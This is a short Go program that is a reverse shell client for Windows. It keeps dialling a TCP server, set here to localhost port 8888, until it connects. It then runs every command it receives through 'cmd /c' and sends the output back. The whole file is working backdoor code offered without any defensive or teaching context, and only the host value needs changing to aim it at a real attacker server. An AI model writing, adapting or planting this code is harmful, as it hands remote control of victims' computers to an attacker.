package main

import (
	"fmt"
	"net"
	"os/exec"
)

const HOST = "localhost"
const PORT = "8888"

func main() {
	// first try connection to the server and init vars
	conn, err := net.Dial("tcp", HOST+":"+PORT)

	// connect to the server until there are no errors
	for err != nil {
		conn, err = net.Dial("tcp", HOST+":"+PORT)
	}

	buff := make([]byte, 1024) // buffer for the server commands

	// start infinite loop
	for {
		// listen for the server commands
		size, err := conn.Read(buff)

		// if there is no error, exec the command
		if err == nil {

			cmd := string(buff[:size])

			fmt.Println("Command: " + cmd)
			fmt.Println("Size: " + string(size))

			// exec the command
			out, err := exec.Command("cmd", "/c", cmd).CombinedOutput()

			// if there is an error, send the error message to the server
			if err != nil {
				conn.Write([]byte(err.Error()))
			} else {
				// else, send the output to the server
				conn.Write(out)
			}
		}
	}
}
